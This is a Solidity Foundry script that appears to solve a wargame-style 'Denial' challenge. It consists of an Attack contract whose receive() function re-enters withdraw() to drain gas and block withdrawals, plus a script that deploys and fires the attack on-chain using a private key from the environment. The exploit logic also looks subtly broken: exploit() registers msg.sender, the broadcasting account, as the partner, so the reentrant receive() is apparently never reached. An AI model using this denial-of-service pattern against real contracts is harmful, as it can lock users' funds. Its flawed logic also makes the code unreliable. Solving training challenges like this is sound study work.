// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../src/Denial.sol";
import "@forge-std/Script.sol";

contract Attack {
    Denial public denial;
    constructor(address payable denialAddress) {
        denial = Denial(payable(denialAddress));
    }

    receive() external payable {
        denial.withdraw();
    }

    function exploit() public {
        denial.setWithdrawPartner(msg.sender);
        denial.withdraw();
    }
}

contract DenialScript is Script {

    Denial public denialContract;

    function setUp() public {
        denialContract = Denial(payable(vm.envAddress("DENIAL_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(payable(denialContract));
        attack.exploit();
        vm.stopBroadcast();
    }
}


